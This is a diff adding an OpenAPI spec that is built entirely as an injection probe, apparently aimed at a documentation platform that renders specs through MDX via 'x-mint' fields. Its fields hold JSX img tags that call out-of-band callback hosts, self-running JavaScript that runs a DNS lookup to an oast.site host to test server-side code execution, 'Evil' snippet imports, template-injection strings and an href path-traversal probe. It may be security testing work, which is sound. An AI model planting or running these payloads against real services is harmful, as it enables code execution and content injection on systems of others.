@@ -1,0 +1,93 @@
+openapi: 3.0.4
+info:
+  title: ISVS2-TITLE-9K4M {{isvs.titlevar}} ${isvsTitleVar} %s
+  description: |
+    ISVS2-INFO-DESC-9K4M start.
+    Raw JSX: <img src="https://isvs-img-info.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/info-desc" />
+    Expression: {globalThis.process?.version ?? 'ISVS2-EXPR-INFO-NOEVAL'}
+    Side-effect expression: {(()=>{try{require('node:dns').lookup('isvs-expr-info.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site',()=>{})}catch(e){};return 'ISVS2-EXPR-INFO'})()}
+    Snippet import: import Evil from '/snippets/Canary.tsx'
+    Template shapes: {{isvs.descvar}} ${isvsDescVar} %s %d
+    Island code fence:
+    ```tsx
+    export default function X() { return <div>ISVS2-FENCE-ISLAND</div> }
+    ```
+    ISVS2-INFO-DESC-9K4M end.
+  version: 1.0.0
+  externalDocs:
+    description: ISVS2-EXTDOCS-9K4M
+    url: https://isvs-extdocs.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/extdocs
+servers:
+  - url: https://isvs-servers.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/v1
+    description: ISVS2-SERVERS-9K4M
+tags:
+  - name: isvs2p1
+    description: |
+      ISVS2-TAG-DESC-9K4M <img src="https://isvs-img-tag.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/tag" /> {{isvs.tagvar}} ${isvsTagVar} %s
+paths:
+  /p1:
+    get:
+      tags: [isvs2p1]
+      summary: ISVS2-P1-SUMMARY-9K4M {{isvs.s1}} ${isvsS1} %s
+      description: |
+        ISVS2-P1-DESC-9K4M. Expression: {globalThis.process?.version ?? 'ISVS2-P1-NOEVAL'}.
+        Raw JSX: <img src="https://isvs-img-p1.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/p1" />
+        import Evil from '/snippets/Canary.tsx'
+        {{isvs.p1var}} ${isvsP1Var} %s
+      operationId: isvs2P1Op
+      x-mint:
+        content: |
+          ISVS2-XMINT-CONTENT-9K4M start
+          import Evil from '/snippets/Canary.tsx'
+
+          <Evil />
+
+          <img src="https://isvs-img-xmint.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/xmint-content" />
+          {(()=>{try{require('node:dns').lookup('isvs-expr-xmint.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site',()=>{})}catch(e){};return 'ISVS2-XMINT-EXPR'})()}
+          {{isvs.xmvar}} ${isvsXmVar} %s
+          ISVS2-XMINT-CONTENT-9K4M end
+      responses:
+        '200':
+          description: ISVS2-P1-RESP-9K4M response
+          content:
+            application/json:
+              schema:
+                type: object
+                properties:
+                  field1:
+                    type: string
+                    description: |
+                      ISVS2-SCHEMA-DESC-9K4M <img src="https://isvs-img-schema.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/schema" /> {{isvs.schvar}} ${isvsSchVar} %s
+  /p2:
+    get:
+      tags: [isvs2p1]
+      summary: ISVS2-P2-SUMMARY-9K4M
+      description: ISVS2-P2-DESC-9K4M plain description field.
+      operationId: isvs2P2Op
+      x-mint:
+        pre:
+          - |
+            ISVS2-XMINT-PRE-9K4M <img src="https://isvs-img-pre.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/pre" /> {globalThis.process?.version ?? 'ISVS2-PRE-NOEVAL'} {{isvs.prevar}} ${isvsPreVar} %s
+        post:
+          - |
+            ISVS2-XMINT-POST-9K4M <img src="https://isvs-img-post.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/post" /> {globalThis.process?.version ?? 'ISVS2-POST-NOEVAL'} {{isvs.postvar}} ${isvsPostVar} %s
+        metadata:
+          title: ISVS2-P2-META-TITLE-9K4M {{isvs.mt}} ${isvsMt} %s
+          description: ISVS2-P2-META-DESC-9K4M <img src="https://isvs-img-metadesc.dbbnati80pk457o9kj7gzi9wf3556qmjy.oast.site/meta-desc" /> {{isvs.md}} ${isvsMd} %s
+          icon: shield
+      responses:
+        '200':
+          description: ISVS2-P2-RESP-9K4M response
+  /p3:
+    get:
+      tags: [isvs2p1]
+      summary: ISVS2-P3-HREF-9K4M
+      description: ISVS2-P3-DESC-9K4M href-escape probe page.
+      operationId: isvs2P3Op
+      x-mint:
+        href: ../../isvs2-href-escape
+        content: |
+          ISVS2-P3-CONTENT-9K4M body after href escape.
+      responses:
+        '200':
+          description: ISVS2-P3-RESP-9K4M response
